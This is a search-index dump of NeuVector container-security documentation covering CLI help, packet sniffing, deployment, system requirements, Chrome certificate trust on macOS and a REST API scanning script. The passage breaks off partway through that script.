container Options: -h, --help Show this message and exit.   &gt; request scan node -h Usage: cli request scan node [OPTIONS] ID_OR_NAME Request to scan one node Options: -h, --help Show this message and exit.   &gt; show scan container -h Usage: cli show scan container [OPTIONS] Show scan container summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --node TEXT list scan result on a given node --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan node -h Usage: cli show scan node [OPTIONS] Show scan node summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan image -h Usage: cli show scan image [OPTIONS] Show scan image summary Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. --first INTEGER list the first n scan result, default is list all -h, --help Show this message and exit.   &gt; show scan report container -h Usage: cli show scan report container [OPTIONS] ID_OR_NAME Show scan container detail report Options: -h, --help Show this message and exit.   &gt; show scan report image -h Usage: cli show scan report image [OPTIONS] NAME Show scan image detail report Options: -h, --help Show this message and exit.   &gt; show scan report node -h Usage: cli show scan report node [OPTIONS] ID_OR_NAME Show scan node detail report Options: -h, --help Show this message and exit.   ","version":"Next 🚧","tagName":"h3"},{"title":"Show/Debug commands​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#showdebug-commands","content":" &gt; show container -h Usage: cli show container [OPTIONS] COMMAND [ARGS]... Show container. Options: -b, --brief brief output --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show container detail. setting show container configurations. stats Show container statistics.   &gt; show enforcer -h Usage: cli show enforcer [OPTIONS] COMMAND [ARGS]... Show enforcer. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: counter Show enforcer counters. detail Show enforcer detail. setting show enforcer configurations. stats Show enforcer statistics.   &gt; show conversation -h Usage: cli show conversation [OPTIONS] COMMAND [ARGS]... Show conversations. Options: -g, --group TEXT filter conversations by group --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: pair Show conversation detail between a pair of...   &gt; show controller -h Usage: cli show controller [OPTIONS] COMMAND [ARGS]... Show controller. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show controller detail. setting show controller configurations.   &gt; show group -h Usage: cli show group [OPTIONS] COMMAND [ARGS]... Show group. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: detail Show group detail.   &gt; show log -h Usage: cli show log [OPTIONS] COMMAND [ARGS]... Log operations. Options: -h, --help Show this message and exit. Commands: event List events. threat List threats. violation List policy violations.   &gt; show node -h Usage: cli show node [OPTIONS] COMMAND [ARGS]... Show node. Options: --sort TEXT sort field. --sort_dir [asc|desc] sort direction. -h, --help Show this message and exit. Commands: bench Show node bench. detail Show node detail. ip_2_container Show node ip-container map.   &gt; show policy -h Usage: cli show policy [OPTIONS] COMMAND [ARGS]... Show policy. Options: -h, --help Show this message and exit. Commands: derived List derived policy rules rule Show policy rule.   &gt; show session -h Usage: cli show session [OPTIONS] COMMAND [ARGS]... Show sessions. Options: -h, --help Show this message and exit. Commands: list list session. summary show session summary.   &gt; show system -h Usage: cli show system [OPTIONS] COMMAND [ARGS]... System operations. Options: -h, --help Show this message and exit. Commands: setting Show system configuration. summary Show system summary.   &gt; show user -h Usage: cli show user [OPTIONS] COMMAND [ARGS]... Show user. Options: -h, --help Show this message and exit.   &gt; set enforcer -h Usage: cli set enforcer [OPTIONS] ID_OR_NAME COMMAND [ARGS]... Set enforcer configuration. Options: -h, --help Show this message and exit. Commands: debug Configure enforcer debug.   &gt; delete conversation pair -h Usage: cli delete conversation pair [OPTIONS] CLIENT SERVER Delete conversations between a pair of containers. Options: -h, --help Show this message and exit.   &gt; delete session -h Usage: cli delete session [OPTIONS] clear session. Options: -e, --enforcer TEXT filter sessions by enforcer --id TEXT filter sessions by session id -h, --help Show this message and exit.   ","version":"Next 🚧","tagName":"h3"},{"title":"Export/Import​","type":1,"pageTitle":"Command Line","url":"/next/tronubleshooting/cli#exportimport","content":" &gt; request export config -h Usage: cli request export config [OPTIONS] Export system configurations. Options: -s, --section [user|policy] -f, --filename PATH -h, --help Show this message and exit.   &gt; request import config -h Usage: cli request import config [OPTIONS] FILENAME Import system configurations. Options: -h, --help Show this message and exit.   Packet Sniffer​  note Sniffer files are stored in the /var/neuvector/pcap directory in the Enforcer container. Make sure you map the volume to your guest machine directory or local system directory to be able to access the files. For example in the docker-compose file add ‘- /var/neuvector:/var/neuvector’ in volumes.  To start packet capture on a pod, you will need to know the containerID to pass into the ID_OR_NAME field. You can do this with show container -c &lt;container_name&gt;. then start the sniffer with request sniffer start &lt;container_id&gt;. For example,  admin#neuvector-svc-controller.neuvector&gt; show container -c pos-test +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ | id | name | host_name | image | state | applications | started_at | interfaces | +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ | fc0b5458db1a | k8s_POD_pos-test_pos-test_bd3e2c9d-847a-4bcd-ac76-cb6fa651a8d2_0 | gtk8s-node2 | k8s.gcr.io/pause:3.2 | discover | [] | 2021-09-24T15:36:05Z | eth0:192.168.128.22/32 | | 0f48441a21cd | k8s_POD_pos-test_pos-test_c405efe5-f767-4fbf-b424-ea3106d9ec62_0 | gtk8s-node1 | k8s.gcr.io/pause:3.2 | exit | [] | 2021-09-23T23:53:56Z | {} | | 8ddb6052f2d1 | k8s_pos-test_pos-test_pos-test_bd3e2c9d-847a-4bcd-ac76-cb6fa651a8d2_0 | gtk8s-node2 | docker.io/garricktam/jmeter-pos:5.4.1 | discover | [] | 2021-09-24T15:36:40Z | eth0:192.168.128.22/32 | +--------------+-----------------------------------------------------------------------+-------------+---------------------------------------+----------+--------------+----------------------+------------------------+ admin#neuvector-svc-controller.neuvector&gt; request sniffer start 8ddb6052f2d1 admin#neuvector-svc-controller.neuvector&gt; show sniffer -c 8ddb6052f2d1 Total sniffers: 2 +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ | id | status | enforcer_id | container_id | size | file_number | +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ | 01119c164ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | | 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | running | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | +--------------------------------------------------------------------------+---------+--------------+--------------+------+-------------+ admin#neuvector-svc-controller.neuvector&gt; request sniffer stop 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 admin#neuvector-svc-controller.neuvector&gt; show sniffer -c 8ddb6052f2d1 Total sniffers: 2 +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+ | id | status | enforcer_id | container_id | size | file_number | +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+ | 01119c164ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 24 | 1 | | 1f0702444ab9cc73178f217ab7a6dc25075a6fe5869ab836eda172925fe7b068cd573030 | stopped | 4ab9cc73178f | 8ddb6052f2d1 | 20165 | 1 | +--------------------------------------------------------------------------+---------+--------------+--------------+-------+-------------+   important If the duration is not set, you will need to find the sniffer ID in order to stop the sniffer. To do this, show sniffer -c &lt;containerID&gt;. Follow by request sniffer stop &lt;sniffer_ID&gt;.  Command options:  request sniffer start -h Usage: cli request sniffer start [OPTIONS] Start sniffer. Options: -e, --enforcer TEXT Add sniffer by enforcer -c, --container TEXT Add sniffer by container -f, --file_number INTEGER Maximum number of rotation files -s, --file_size INTEGER Maximum size (in MB) of rotation files -o, --options TEXT Sniffer filter -h, --help Show this message and exit.   show sniffer -h Usage: cli show sniffer [OPTIONS] COMMAND [ARGS]... Show sniffer. Options: -e, --enforcer TEXT Show sniffers by enforcer -h, --help Show this message and exit.   request sniffer stop -h Usage: cli request sniffer stop [OPTIONS] ID Stop sniffer. You may need to include both the enforcer ID and the container ID. Options: -e, --enforcer TEXT Delete sniffer by enforcer -h, --help Show this message and exit.  ","version":"Next 🚧","tagName":"h3"},{"title":"Deployment Preparation","type":0,"sectionRef":"#","url":"/basics/installation/native","content":"","keywords":"","version":"5.3"},{"title":"Understanding How to Deploy NeuVector​","type":1,"pageTitle":"Deployment Preparation","url":"/basics/installation/native#understanding-how-to-deploy-neuvector","content":" Deploy the NeuVector containers using Kubernetes, OpenShift, Rancher, Docker, or other platforms. Each type of NeuVector container has a unique purpose and may require special performance or node selection requirements for optimum operation.  The NeuVector open source images are hosted on Docker Hub at /neuvector/{image name}.  See the Onboarding/Best Practices section to download an on boarding guide.  Deploy using Kubernetes, OpenShift, Rancher, or other Kubernetes-based tools​  To deploy NeuVector using Kubernetes, OpenShift, Rancher or other orchestration tools, see the preparation steps and sample files in the section Deploying NeuVector. This deploys manager, controller, scanner, and enforcer containers. For simple testing using the NeuVector Allinone container, see the section Special Use Cases with Allinone.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  Automated deployments are supported using Helm, Red Hat/Community Operators, the rest API, or a Kubernetes ConfigMap. See the section Deploy Using ConfigMap for more details on automating deployment.  Deploy using Docker Native​  Before you deploy NeuVector with docker run or compose, you MUST set the CLUSTER_JOIN_ADDR to the appropriate IP address. Find the node IP address, node name (if using a name server, or node variable (if using orchestration tools) for the allinone (controller) to use for the “node IP” in the docker-compose files for both allinone and enforcer. For example:  - CLUSTER_JOIN_ADDR=192.168.33.10   For Swarm-Based deployments, also add the following environment variable:  - NV_PLATFORM_INFO=platform=Docker   See the section Deploying NeuVector -&gt; Docker Production Deployment for instructions and examples.  Backing Up Configuration Files​  By default NeuVector stores various config files in /var/neuvector/config/backup on the Controller or Allinone node.  This volume can be mapped to persistent storage to maintain configuration. Files in the folder may need to be deleted in order to start fresh.  Volume Mapping​  Make sure volumes are mapped properly. NeuVector requires these to operate (/var/neuvector is only required on controller/allinone). For example:  volumes: - /lib/modules:/lib/modules:ro - /var/neuvector:/var/neuvector - /var/run/docker.sock:/var/run/docker.sock:ro - /proc:/host/proc:ro - /sys/fs/cgroup:/host/cgroup:ro   Also, you may need to ensure that other tools are not blocking access to the docker.sock interface.  Ports and Port Mapping​  Make sure the required ports are mapped properly and open on the host. The Manager or Allinone requires 8443 (if using the console). The Allinone and Controller requires 18300, 18301, 18400, 18401 and optionally 10443, 11443, 20443, 30443. The Enforcer requires 18301 and 18401.  Note: If deploying docker native (including SWARM) make sure there is not any host firewall blocking access to required ports such as firewalld. If enabled, the docker0 interface must be added as a trusted zone for the allinone/controller hosts.  Port Summary​  The following table lists communications from each NeuVector container. The Allinone container combines the Manager, Controller and Enforcer containers so requires the ports listed for those containers.    The following table summarizes the listening ports for each NeuVector container.    Additional Ports​  In version 5.1, a new listener port has been added on 8181 in the controller for local controller communication only.  tcp 0 0 :::8181 :::* LISTEN 8/opa  ","version":"5.3","tagName":"h3"},{"title":"Installation / Deployment","type":0,"sectionRef":"#","url":"/basics/installation","content":"Installation / Deployment Deploy the NeuVector containers using Kubernetes, OpenShift, Rancher, AWS EKS, Azure AKS, Google GKE, IBM IKS, docker run, or docker-compose.","keywords":"","version":"5.3"},{"title":"Configuring NeuVector and Accessing the Console","type":0,"sectionRef":"#","url":"/configuration","content":"Configuring NeuVector and Accessing the Console How to perform initial configurations and access the console.","keywords":"","version":"5.3"},{"title":"5.x Overview","type":0,"sectionRef":"#","url":"/basics/overview","content":"","keywords":"","version":"5.3"},{"title":"The Full Life-Cycle Container Security Platform​","type":1,"pageTitle":"5.x Overview","url":"/basics/overview#the-full-life-cycle-container-security-platform","content":" note These docs describe the 5.x (Open Source) version. The 5.x images are accessible from Docker Hub with the appropriate tag, e.g. neuvector/controller:(version). For 4.x versions see the 4.x Docs.  NeuVector provides a powerful end-to-end container security platform. This includes end-to-end vulnerability scanning and complete run-time protection for containers, pods and hosts, including:  CI/CD Vulnerability Management &amp; Admission Control. Scan images with a Jenkins plug-in, scan registries, and enforce admission control rules for deployments into production.Violation Protection. Discovers behavior and creates a whitelist based policy to detect violations of normal behavior.Threat Detection. Detects common application attacks such as DDoS and DNS attacks on containers.DLP and WAF Sensors. Inspect network traffic for Data Loss Prevention of sensitive data, and detect common OWASP Top10 WAF attacks.Run-time Vulnerability Scanning. Scans registries, images and running containers orchestration platforms and hosts for common (CVE) as well as application specific vulnerabilities.Compliance &amp; Auditing. Runs Docker Bench tests and Kubernetes CIS Benchmarks automatically.Endpoint/Host Security. Detects privilege escalations, monitors processes and file activity on hosts and within containers, and monitors container file systems for suspicious activity.Multi-cluster Management. Monitor and manage multiple Kubernetes clusters from a single console.  Other features of NeuVector include the ability to quarantine containers and to export logs through SYSLOG and webhooks, initiate packet capture for investigation, and integration with OpenShift RBACs, LDAP, Microsoft AD, and SSO with SAML. Note: Quarantine means that all network traffic is blocked. The container will remain and continue to run - just without any network connections. Kubernetes will not start up a container to replace a quarantined container, as the api-server is still able to reach the container.  ","version":"5.3","tagName":"h3"},{"title":"Security Containers​","type":1,"pageTitle":"5.x Overview","url":"/basics/overview#security-containers","content":" The NeuVector run-time container security solution contains four types of security containers: Controllers, Enforcers, Managers, and Scanners. A special container called the Allinone is also provided to combine the Controller, Enforcer, and Manager functions all in one container, primarily for docker native deployments.  NeuVector can be deployed on virtual machines or on bare metal systems with a single os.  Controller​  The Controller manages the NeuVector Enforcer container cluster. It also provides REST APIs for the management console. Although typical test deployments have one Controller, multiple Controllers in a high-availability configuration is recommended. 3 controllers is the default in the Kubernetes Production deployment sample yaml.  Enforcer​  The Enforcer is a lightweight container that enforces the security policies. One enforcer should be deployed on each node (host), e.g. as a Daemon set.  note For Docker native (non Kubernetes) deployments the Enforcer container and the Controller cannot be deployed on the same node (except in the All-in-One case below).  Manager​  The Manager is a stateless container that provides a web-UI (HTTPS only) console for users to manage the NeuVector security solution. More than one Manager container can be deployed as necessary.  All-in-One​  The All-in-One container includes a Controller, an Enforcer and a Manager in one package. It's useful for easy installation in single-node or small-scale deployments.  Scanner​  The Scanner is a container which performs the vulnerability and compliance scanning for images, containers and nodes. It is typically deployed as a replicaset and can be scaled up to as many parallel scanners as desired in order to increase the scanning performance. The Controller assigns scanning jobs to each available scanner in a round-robin fashion until all scans are completed. The scanner also contains the latest CVE database and is updated regularly by NeuVector.  Updater​  The Updater is a container which when run, updates the CVE database for NeuVector. NeuVector regularly publishes new scanner images to include the latest CVE for vulnerability scans. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up, forcing a pull of an updated scanner image.  Architecture​  Here is a general architecture overview of NeuVector. Not shown is the separate scanner container, which can also be run as a stand-alone pipeline scanner.  ","version":"5.3","tagName":"h3"},{"title":"Deployment Examples​","type":1,"pageTitle":"5.x Overview","url":"/basics/overview#deployment-examples","content":" For common deployment patterns and best practices see the Onboarding/Best Practices section.  All-in-One and Enforcers​  This deployment is ideal for single-node or small-scale environments, for example for evaluation, testing, and small deployments. An All-in-One container is deployed on one node, which can also be a node with running application containers. An Enforcer can be deployed on all other nodes, with one Enforcer required on each node you wish to protect with NeuVector. This is also useful for native Docker deployments where a controller and enforcer cannot run on the same host.  Controller, Manager and Enforcer Containers​  This is a more generic deployment use case which consists one or more Controllers, one Manager and a set of Enforcers. The Controller and Manager can be deployed on the same node or on different nodes than the Enforcer.  All-in-One Only​  You can deploy just the allinone container for registry scanning, using the Jenkins plug-in, or simple one node testing of NeuVector.  Controller Only​  It is possible to deploy a single Controller container and/or scanner to manage vulnerability scanning outside a cluster, for example for use with the Jenkins plug-in. Registry scanning can also be performed by the Controller using the REST API exclusively, but typically a Manager container is also desired in order to provide console based configuration and results viewing for registry scanning. ","version":"5.3","tagName":"h3"},{"title":"System Requirements","type":0,"sectionRef":"#","url":"/basics/requirements","content":"System Requirements System Requirements​ Component\t# of Instances\tRecommended vCPU\tMinimum Memory\tNotesController\tmin. 1 3 for HA (odd # only)\t1\t1GB\tvCPU core may be shared Enforcer\t1 per node/VM\t1+\t1GB\tOne or more dedicated vCPU for higher network throughput in Protect mode Scanner\tmin. 1 2+ for HA/Performance\t1\t1GB\tCPU core may be shared for standard workloads. Dedicate 1 or more CPU for high volume (10k+) image scanning. Registry image scanning is performed by the scanner and managed by the controller and the image is pulled by the scanner and expanded in memory. The minimum memory recommendation assumes images to be scanned are not larger than .5GB. When scanning images larger than 1GB, scanner memory should be calculated by taking the largest image size and adding .5GB. Example - largest image size = 1.3GB, the scanner container memory should be 1.8GB Manager\tmin 1 2+ for HA\t1\t1GB\tvCPU may be shared For configuration backup/HA, a RWX PVC of 1Gi or more. See Backups and Persistent Data section for more details.Recommended browser: Chrome for better performance Supported Platforms​ Officially supported linux distributions, SUSE Linux, Ubuntu, CentOS/Red Hat (RHEL), Debian, CoreOS, AWS Bottlerocket and Photon.AMD64 and Arm architecturesCoreOS is supported (November 2023) for CVE scanning through RHEL mapping table provided by RedHat. Once an official feed is published by RedHat for CoreOS it will be supported.Officially supported Kubernetes and Docker compliant container management systems. The following platforms are tested with every release of NeuVector: Kubernetes 1.19-1.29, SUSE Rancher (RKE, RKE2, K3s etc), RedHat OpenShift 4.6-4.13 (3.x to 4.12 supported prior to NeuVector 5.2.x), Google GKE, Amazon EKS, Microsoft Azure AKS, IBM IKS, native docker, docker swarm. The following Kubernetes and docker compliant platforms are supported and have been verified to work with NeuVector: VMware Photon and Tanzu, SUSE CaaS, Oracle OKE, Mirantis Kubernetes Engine, Nutanix Kubernetes Engine, docker UCP/DataCenter, docker Cloud.Docker run-time version: 1.9.0 and up; Docker API version: 1.21, CE and EE.Containerd and CRI-O run-times (requires changes to volume paths in sample yamls). See changes required for Containerd in the Kubernetes deployment section and CRI-O in the OpenShift deployment section.NeuVector is compatible with most commercially supported CNI's. Officially tested and supported are openshift ovs (subnet/multitenant), calico, flannel, cilium, antrea and public clouds (gke, aks, iks, eks). Note: The multus cni is not currently supported but is on the 2024 roadmap.Console: Chrome or Firefox browser recommended. IE 11 not supported due to performance issues.Minikube is supported for simple initial evaluation but not for full proof of concept. See below for changes required for the Allinone yaml to run on Minikube. AWS Bottlerocket Note: Must change path of the containerd socket specific to Bottleneck. Please see Kubernetes deployment section for details. Not Supported​ GKE Autopilot.The multus cni is not currently supported but is on the 2024 roadmap.AWS ECS is no longer supported. (NOTE: No functionality has been actively removed for operating NeuVector on ECS deployments. However, testing on ECS is no longer being perfromed by SUSE. While protecting ECS workloads with Neuvector likely will operate as expected, issues will not be investigated.)Docker on MacDocker on WindowsRkt (container linux) from CoreOSAppArmor on K3S / SLES environments. Certain configurations may conflict with NeuVector and cause scanner errors; AppArmor should be disabled when deploying NeuVector.IPv6 is not supportedVMWare Integrated Containers (VIC) except in nested modeCloudFoundryConsole: IE 11 not supported due to performance issues.Nested container host in a container tools used for simple testing. For example, deployment of a Kubernetes cluster using 'kind' https://kind.sigs.k8s.io/docs/user/configuration/. Note 1: PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock note NeuVector supports running on linux-based VMs on Mac/Windows using Vagrant, VirtualBox, VMware or other virtualized environments. Minikube​ Please make the following changes to the Allinone deployment yaml. apiVersion: apps/v1 &lt;&lt;-- required for k8s 1.19 kind: DaemonSet metadata: name: neuvector-allinone-pod namespace: neuvector spec: selector: &lt;-- Added matchLabels: &lt;-- Added app: neuvector-allinone-pod &lt;-- Added minReadySeconds: 60 ... nodeSelector: &lt;-- DELETE THIS LINE nvallinone: &quot;true&quot; &lt;-- DELETE THIS LINE apiVersion: apps/v1 &lt;&lt;-- required for k8s 1.19 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: &lt;-- Added matchLabels: &lt;-- Added app: neuvector-enforcer-pod &lt;-- Added Performance and Scaling​ As always, performance planning for NeuVector containers will depend on several factors, including: (Controller &amp; Scanner) Number and size of images in registry to be scanned (by Scanner) initially(Enforcer) Services mode (Discover, Monitor, Protect), where Protect mode runs as an inline firewall(Enforcer) Type of network connections for workloads in Protect mode In Monitor mode (network filtering similar to a mirror/tap), there is no performance impact and the Enforcer handles traffic at line speed, generating alerts as needed. In Protect mode (inline firewall), the Enforcer requires CPU and memory to filter connections with deep packet inspection and hold them to determine whether they should be blocked/dropped. Generally, with 1GB of memory and a shared CPU, the Enforcer should be able to handle most environments while in Protect mode. For throughput or latency sensitive environments, additional memory and/or a dedicated CPU core can be allocated to the NeuVector Enforcer container. For performance tuning of the Controller and Scanner for registry scanning, see System Requirements above. For additional advice on performance and sizing, see the Onboarding/Best Practices section. Throughput​ As the chart below shows, basic throughput benchmark tests showed a maximum throughput of 1.3 Gbps PER NODE on a small public cloud instance with 4 CPU cores. For example, a 10 node cluster would then be able to handle a maximum of 13 Gbps of throughput for the entire cluster for services in Protect mode. This throughput would be projected to scale up as dedicated a CPU is assigned to the Enforcer, or the CPU speed changes, and/or additional memory is allocated. Again, the scaling will be dependent on the type of network/application traffic of the workloads. Latency​ Latency is another performance metric which depends on the type of network connections. Similar to throughput, latency is not affected in Monitor mode, only for services in Protect (inline firewall) mode. Small packets or simple/fast services will generate a higher latency by NeuVector as a percentage, while larger packets or services requiring complex processing will show a lower percentage of added latency by the NeuVector enforcer. The table below shows the average latency of 2-10% benchmarked using the Redis benchmark tool. The Redis Benchmark uses fairly small packets, so the the latency with larger packets would expected to be lower. Test\tMonitor\tProtect\tLatencyPING_INLINE\t34,904\t31,603\t9.46% SET\t38,618\t36,157\t6.37% GET\t36,055\t35,184\t2.42% LPUSH\t39,853\t35,994\t9.68% RPUSH\t37,685\t36,010\t4.45% LPUSH (LRANGE Benchmark)\t37,399\t35,220\t5.83% LRANGE_100\t25,539\t23,906\t6.39% LRANGE_300\t13,082\t12,277\t6.15% The benchmark above shows average TPS of Protect mode versus Monitor mode, and the latency added for Protect mode for several tests in the benchmark. The main way to lower the actual latency (microseconds) in Protect mode is to run on a system with a faster CPU. You can find more details on this open source Redis benchmark tool at https://redis.io/topics/benchmarks.","keywords":"","version":"5.3"},{"title":"Chrome Certificate Upload - MacOS","type":0,"sectionRef":"#","url":"/configuration/console/chrome","content":"","keywords":"","version":"5.3"},{"title":"Enabling Chrome Browsers to Accept the NeuVector Self-Signed Certificate on MacOS​","type":1,"pageTitle":"Chrome Certificate Upload - MacOS","url":"/configuration/console/chrome#enabling-chrome-browsers-to-accept-the-neuvector-self-signed-certificate-on-macos","content":" Under certain circumstances the Chrome browser will flat out refuse to accept a NeuVector self-signed certificate. A possible reason could be that the certificate has not yet been imported into macOS login certificates store. Another possibility is that an existing certificate has not yet been configured to be trusted. This will disallow the user from accepting it and proceeding to the NeuVector login page with the use of Chrome as illustrated with the example shown below:    Corrective steps can be taken to enable Chrome on accepting the self-signed certificate placed on macOS Keychain store. This can be done by configuring the NeuVector’s certificate to be trusted using the Mac’s Keychain Access application. This is with the assumption that the certificate does indeed exists in the macOS Keychain Access store. We will first look at how to export a certificate from an existing NeuVector node from one system, and later can be imported into another system. There are 2 ways to go about exporting the certificate which we will go over below. They are, using the Chrome browser, and using the macOS Keychain Access application.  Certificate export using Chrome​  The screen capture below illustrates how to access the NeuVector certificate using Chrome.    To export the certificate, drag and drop the certificate to a location of choice.    Certificate export using macOS Keychain-Access​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and double click on the application. This launches the Keychain Access application. Select the NeuVector certificate and choose Export “NeuVector” from the dropdown menu. This will allow the export of the certificate to a location of choice.    Launching the macOS Keychain-Access Application​  There are two ways to launch the macOS Keychain Access Application. This can be done by searching from the macOS, which has been described from the steps immediately above, or using the Chrome browser.  Launching Keychain-Access from the Chrome Browser​  Settings &gt; Advanced &gt; Manage certificates    Clicking on the Manage certificates as shown from above launches the Mac’s Keychain Access application as shown below.    Certificate import into the macOS Keychain-Access Store​  Launch the macOS Keychain Access application by simultaneously entering the keys ⌘ + F using a Mac keyboard, search for Keychain Access, and click on the application. Then import the certificate by drag and dropping a NeuVector certificate (example: nvcertificate.cer) into the Certificate right pane of the Keychain Access application. Now that the certificate has been imported, it is not yet trusted. The following is an example showing the default trust settings after a NeuVector’s certificate has been imported into the Keychain Access application.    Notice that none of the parameters have been configured, and it is not trusted by default. It needs to be configured to be trusted to allow the user to access the login page using the Chrome browser.  Enabling trust for the NeuVector Certificate​  The following steps details on how to enable trust for the NeuVector certificate in the Keychain Access store.    Double clicking on the NeuVector certificate from the screen capture above will bring up another popup dialog box that allows the trust permissions to be configured for different parameters. Configure Secure Sockets Layer (SSL) to “Always Trust”.    Close the dialog box and click on ‘Update Settings” after entering the Mac logon user’s password from the following popup dialog box.    This finalizes the trust configurations. Next, clear all Chrome browser’s cache, close all Chrome browsers, and relaunch the Chrome browser. Next visit the NeuVector login page, and upon clicking on the “Advanced” link, the Proceed to … (unsafe) link will be shown. Clicking on the Proceed to … (unsafe) will allow the user to proceed to the username and password login page.    Below shows a screen capture that allows the user to proceed to the NeuVector login page after Proceed to … (Unsafe) link is clicked.   ","version":"5.3","tagName":"h3"},{"title":"REST API and Automation","type":0,"sectionRef":"#","url":"/automation/automation","content":"","keywords":"","version":"5.3"},{"title":"NeuVector Automation​","type":1,"pageTitle":"REST API and Automation","url":"/automation/automation#neuvector-automation","content":" There are many automation features in NeuVector to support the entire CI/CD workflow, including:  Jenkins plug-in to automated scanning during buildRegistry scanning to automate repository monitoringAdmission Control policies to allow/deny unauthorized deploymentsCIS benchmarks automatically run on hostsHelm chart on github for automated deployment on KubernetesResponse rules to automate responses to security eventsREST API for building automation of any NeuVector function  REST API​  The NeuVector solution can be managed using the REST API. Below are common examples of automation using the REST API. The REST API yaml doc is best viewed in the Swagger 2.0 viewer. The REST API documentation is below in a yaml file which is best viewed in a reader such as swagger.io.  Latest update can be found here. Also in the NeuVector GitHub source code repo. The apis.yaml from the main truck can include unreleased features. It is recommended to download the appropriate released version source code and extract the apis.yaml from the controller/api folder.  important If you are making REST API calls with username/password, please be sure make a DELETE call against /v1/auth when done. There is a maximum of 32 concurrent sessions for each user. If this is exceeded, an authentication failure will occur.  NeuVector also support Response Rules to automate common responses to security events or vulnerabilities detected. Please see the section Security Policy -&gt; Response Rules for more details.  Expose REST API in Kubernetes​  To expose the REST API for access from outside of the Kubernetes cluster, enable port 10443.  apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller-api namespace: neuvector spec: ports: - port: 10443 name: controller-api protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   note type: NodePort can also be used instead of LoadBalancer.  note If using type LoadBalancer, set the controllerIP in the examples below to the external IP or URL for the loadbalancer.  Authentication for REST API​  The REST API supports two types of authentication: username/password and token. Both can be configured in Settings -&gt; Users, API Keys &amp; Roles, and be associated with default or custom roles to limit access privileges. The examples below show username/password based authentication where a token is created first, then used in subsequent REST API calls. If using a token, it can be used directly in each REST API call. Note: username based connections have a limited number of concurrent sessions, so it is important to delete the username token as shown below when finished. Token based authentication does not have a limit, but expire according to the time limit selected when created.  For token-based authentication, see the following screen shots and example call. Be sure to copy the secret and token once created, as there is no way to retrieve this after the screen in closed.        Trigger Vulnerability Scanning from a script​  NeuVector can be triggered automatically to scan an image for vulnerabilities. This can be done by configuring a registry/repository to be monitored, using the NeuVector Jenkins plug-in, or using the REST API. Please see the section on Scanning &amp; Compliance for more detail.  The sample script below shows how to remotely pull the container, run it, and scan it. It can be triggered from a Jenkins task (remote shell) or any CI/CD tool. A JSON parser tool (jq) is also used.  Be sure to enter the controller IP address in the script and change the container image name to the one you wish to scan. Also, update the username/password fields.  _curCase_=`echo $0 | awk -F&quot;.&quot; '{print $(NF-1)}' | awk -F&quot;/&quot; '{print $NF}'` _DESC_=&quot;able to scan ubuntu:16.04 image&quot; _ERRCODE_=0 _ERRTYPE_=1 _RESULT_=&quot;pass&quot; # please remember to specify the controller ip address here _controllerIP_=&quot;&lt;your_controller_ip&gt;&quot; _controllerRESTAPIPort_=&quot;10443&quot; _neuvectorUsername_=&quot;admin&quot; _neuvectorPassword_=&quot;admin&quot; _registryURL_=&quot;&quot; _registryUsername_=&quot;&quot; _registryPassword_=&quot;&quot; _repository_=&quot;alpine&quot; _tag_=&quot;latest&quot; curl -k -H &quot;Content-Type: application/json&quot; -d '{&quot;password&quot;: {&quot;username&quot;: &quot;'$_neuvectorUsername_'&quot;, &quot;password&quot;: &quot;'$_neuvectorPassword_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/auth&quot; &gt; /dev/null 2&gt;&amp;1 &gt; token.json _TOKEN_=`cat token.json | jq -r '.token.token'` echo `date +%Y%m%d_%H%M%S` scanning an image ... curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: $_TOKEN_&quot; -d '{&quot;request&quot;: {&quot;registry&quot;: &quot;'$_registryURL_'&quot;, &quot;username&quot;: &quot;'$_registryUsername_'&quot;, &quot;password&quot;: &quot;'$_registryPassword_'&quot;, &quot;repository&quot;: &quot;'$_repository_'&quot;, &quot;tag&quot;: &quot;'$_tag_'&quot;}}' &quot;https://$_controllerIP_:$_controllerRESTAPIPort_/v1/scan/repository&quot; &gt; /dev/null 2&gt;&amp;1 &gt; scan_repository.json while [ `wc -c &lt; scan_repository.json` = &quot;0&quot; ]; do echo `date +%Y%m%d_%H%M%S` scanning is still in progress ... sleep 5 curl -k -H &quot;Content-Type: application/json&quot; -H &quot;X-Auth-Token: 